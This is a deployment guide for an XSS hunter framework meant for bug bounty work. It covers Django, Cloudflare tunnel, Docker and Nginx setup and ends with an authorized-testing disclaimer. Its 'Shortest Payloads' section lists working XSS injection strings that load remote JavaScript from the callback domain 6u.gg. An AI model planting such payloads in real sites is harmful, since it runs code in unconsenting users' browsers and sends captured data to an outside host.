# XJutsu v5 Deployment Guide
## by Dave Lester B. Mondina / ANBU Black Ops Security

Quick deployment guide for XJutsu XSS Hunter framework.

---

## Quick Start (Development)

```bash
# Install dependencies
pip install -r requirements.txt

# Run migrations
python manage.py migrate

# Create superuser
python manage.py createsuperuser

# Load payload library
python manage.py load_payload_library

# Run development server
python manage.py runserver 0.0.0.0:8000

# Or with Daphne (ASGI + WebSocket)
daphne -b 0.0.0.0 -p 8000 core.asgi:application
```

---

## Cloudflared Tunnel Setup (Recommended)

Cloudflare Tunnel provides free HTTPS without exposing your server IP.
Perfect for bug bounty with short domains like `6u.gg`.

### Step 1: Install Cloudflared

```bash
# Debian/Ubuntu
wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb
sudo dpkg -i cloudflared-linux-amd64.deb

# Or via package manager
curl -fsSL https://pkg.cloudflare.com/cloudflare-main.gpg | sudo tee /usr/share/keyrings/cloudflare-archive-keyring.gpg >/dev/null
echo "deb [signed-by=/usr/share/keyrings/cloudflare-archive-keyring.gpg] https://pkg.cloudflare.com/cloudflared $(lsb_release -cs) main" | sudo tee /etc/apt/sources.list.d/cloudflared.list
sudo apt update && sudo apt install cloudflared

# MacOS
brew install cloudflared
```

### Step 2: Authenticate with Cloudflare

```bash
cloudflared tunnel login
# This opens browser to authenticate with your Cloudflare account
```

### Step 3: Create Tunnel

```bash
# Create a tunnel (replace 'xjutsu' with your preferred name)
cloudflared tunnel create xjutsu

# Note the tunnel ID from output, e.g.: 12345678-abcd-1234-abcd-123456789abc
```

### Step 4: Configure Tunnel

Create config file at `~/.cloudflared/config.yml`:

```yaml
# ~/.cloudflared/config.yml
tunnel: 12345678-abcd-1234-abcd-123456789abc  # Your tunnel ID
credentials-file: /root/.cloudflared/12345678-abcd-1234-abcd-123456789abc.json

ingress:
  # Main domain
  - hostname: 6u.gg
    service: http://localhost:8000
    originRequest:
      noTLSVerify: true

  # Wildcard (if needed)
  - hostname: "*.6u.gg"
    service: http://localhost:8000

  # Catch-all (required)
  - service: http_status:404
```

### Step 5: Route DNS

```bash
# Route your domain to the tunnel
cloudflared tunnel route dns xjutsu 6u.gg

# For wildcard (if using subdomains)
cloudflared tunnel route dns xjutsu "*.6u.gg"
```

### Step 6: Run Tunnel

```bash
# Test run
cloudflared tunnel run xjutsu

# Or run as service (recommended for production)
sudo cloudflared service install
sudo systemctl start cloudflared
sudo systemctl enable cloudflared
```

### Step 7: Update XJutsu Config

Edit `.env`:

```bash
SHORT_DOMAIN=6u.gg
ALLOWED_HOSTS=6u.gg,*.6u.gg,localhost
DEBUG=False
SECRET_KEY=your-secure-random-key-here
```

---

## Systemd Service (Production)

### XJutsu Service

Create `/etc/systemd/system/xjutsu.service`:

```ini
[Unit]
Description=XJutsu v5 XSS Hunter
After=network.target

[Service]
User=www-data
Group=www-data
WorkingDirectory=/home/user/xjutsu
Environment="PATH=/home/user/xjutsu/venv/bin"
ExecStart=/home/user/xjutsu/venv/bin/daphne -b 127.0.0.1 -p 8000 core.asgi:application
Restart=always
RestartSec=3

[Install]
WantedBy=multi-user.target
```

```bash
sudo systemctl daemon-reload
sudo systemctl start xjutsu
sudo systemctl enable xjutsu
```

---

## Docker Deployment

```bash
# Build and run
docker-compose up -d

# Or manual
docker build -t xjutsu:v5 .
docker run -d -p 8000:8000 -v ./data:/app/data xjutsu:v5
```

### docker-compose.yml with Cloudflared

```yaml
version: '3.8'

services:
  xjutsu:
    build: .
    volumes:
      - ./xjutsu.db:/app/xjutsu.db
      - ./media:/app/media
    environment:
      - SHORT_DOMAIN=6u.gg
      - DEBUG=False
    restart: unless-stopped

  cloudflared:
    image: cloudflare/cloudflared:latest
    command: tunnel run xjutsu
    volumes:
      - ~/.cloudflared:/etc/cloudflared
    depends_on:
      - xjutsu
    restart: unless-stopped
```

---

## Nginx Setup (Alternative to Cloudflared)

See `nginx.conf.example` for full configuration.

Quick setup:
```bash
sudo apt install nginx certbot python3-certbot-nginx
sudo certbot --nginx -d 6u.gg
sudo cp nginx.conf.example /etc/nginx/sites-available/xjutsu
sudo ln -s /etc/nginx/sites-available/xjutsu /etc/nginx/sites-enabled/
sudo nginx -t && sudo systemctl reload nginx
```

---

## Environment Variables

| Variable | Description | Default |
|----------|-------------|---------|
| `SECRET_KEY` | Django secret key | dev key |
| `DEBUG` | Debug mode | True |
| `ALLOWED_HOSTS` | Allowed hosts (comma-separated) | * |
| `SHORT_DOMAIN` | Short domain for payloads | localhost |
| `XJUTSU_TOKEN_SECRET` | Token signing secret | SECRET_KEY |
| `RATE_LIMIT_PAYLOAD` | Payload requests/min | 60 |
| `RATE_LIMIT_CALLBACK` | Callback requests/min | 30 |
| `WEBHOOK_DISCORD` | Discord webhook URL | |
| `WEBHOOK_SLACK` | Slack webhook URL | |
| `TELEGRAM_BOT_TOKEN` | Telegram bot token | |
| `TELEGRAM_CHAT_ID` | Telegram chat ID | |

---

## Payload Endpoints

| Endpoint | Description |
|----------|-------------|
| `/` | Smart root - serves JS when loaded as script |
| `/x.js` | Default payload JavaScript |
| `/p/<uuid>.js` | Payload-specific JavaScript |
| `/m.js` | ES Module payload (for `import()`) |
| `/?t=TOKEN` | Token-validated payload |

### Shortest Payloads

```html
<!-- Classic (23 chars with 6u.gg) -->
<script src=//6u.gg></script>

<!-- IMG onerror -->
<img src=x onerror=import('//6u.gg')>

<!-- SVG onload -->
<svg onload=import('//6u.gg')>

<!-- With token (single-use) -->
<script src=//6u.gg?t=TOKEN></script>
```

---

## Security Checklist

- [ ] Change `SECRET_KEY` in production
- [ ] Set `DEBUG=False`
- [ ] Configure `ALLOWED_HOSTS`
- [ ] Enable HTTPS (Cloudflared or Nginx+Certbot)
- [ ] Set up webhook notifications
- [ ] Configure rate limiting
- [ ] Backup database regularly
- [ ] Review captures for sensitive data

---

## Troubleshooting

### WebSocket not connecting
- Ensure Cloudflared/Nginx properly proxies WebSocket
- Check browser console for connection errors
- Verify `wss://` protocol in production

### Payload not executing
- Check CORS headers in response
- Verify `Content-Type: application/javascript`
- Test with curl: `curl -v https://6u.gg/x.js`

### Token validation failing
- Check token expiry time
- Verify `XJUTSU_TOKEN_SECRET` is consistent
- Check rate limits

---

## Support

For bug bounty hunters: This tool is for **authorized security testing only**.
Always get proper authorization before testing.

Author: Dave Lester B. Mondina / ANBU Black Ops Security
